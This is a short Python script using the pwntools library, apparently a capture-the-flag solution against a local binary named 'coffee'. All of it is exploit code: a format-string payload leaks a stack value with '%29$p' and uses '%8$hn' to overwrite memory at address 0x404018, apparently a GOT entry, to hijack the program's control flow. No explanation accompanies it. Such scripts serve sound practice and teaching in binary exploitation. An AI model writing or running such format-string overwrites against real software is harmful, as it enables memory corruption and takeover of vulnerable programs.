from pwn import *

io = process('./coffee')
elf = ELF('./coffee')


payload = b'%29$p'+b'%4258x'+b'%8$hn'+p64(0x404018)
pause()
io.sendline(payload)
print(io.recv())
print(io.recv())
io.sendline(b'ok')
print(io.recv())
